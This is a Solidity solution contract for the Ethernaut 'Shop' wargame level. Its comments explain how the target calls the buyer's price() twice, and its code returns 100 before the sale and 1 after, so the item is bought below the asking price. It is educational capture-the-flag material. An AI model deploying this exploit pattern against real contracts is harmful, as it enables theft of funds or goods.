// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

/**
 * @title ShopExploit
 * @dev Solution contract for Ethernaut Level 21 - Shop
 * 
 * This contract exploits the Shop contract by implementing a malicious Buyer
 * that returns different prices depending on the Shop's state.
 * 
 * The vulnerability in the Shop contract:
 * - The buy() function calls _buyer.price() TWICE
 * - First call: to check if price >= 100
 * - Second call: to set the final price
 * - Between these calls, isSold is set to true
 * 
 * Attack Strategy:
 * 1. Implement the price() function as a view function
 * 2. First call (when isSold is false): return >= 100 to pass the check
 * 3. Second call (when isSold is true): return < 100 to buy cheap
 * 4. We can check the Shop's isSold state within our view function!
 * 
 * Key Insight:
 * View functions can READ external state, even though they can't modify state.
 * We use this to return different values based on the Shop's isSold flag.
 */
contract ShopExploit {
    address public shop;
    address public owner;

    constructor(address _shop) {
        shop = _shop;
        owner = msg.sender;
    }

    /**
     * @dev Implements the IBuyer interface price() function
     * Returns different values depending on whether the item is sold or not
     * 
     * This is a view function, but it can still return different values
     * by reading the external state of the Shop contract.
     */
    function price() external view returns (uint256) {
        // Check if the item has been sold
        bool sold = IShop(shop).isSold();
        
        if (sold) {
            // Second call - return a low price (less than 100)
            return 1;
        } else {
            // First call - return a high price (>= 100) to pass the check
            return 100;
        }
    }

    /**
     * @dev Execute the exploit to buy the item for less than asking price
     */
    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        IShop(shop).buy();
    }

    /**
     * @dev Check the current price in the Shop
     */
    function checkPrice() external view returns (uint256) {
        return IShop(shop).price();
    }

    /**
     * @dev Check if the item is sold
     */
    function checkIsSold() external view returns (bool) {
        return IShop(shop).isSold();
    }
}
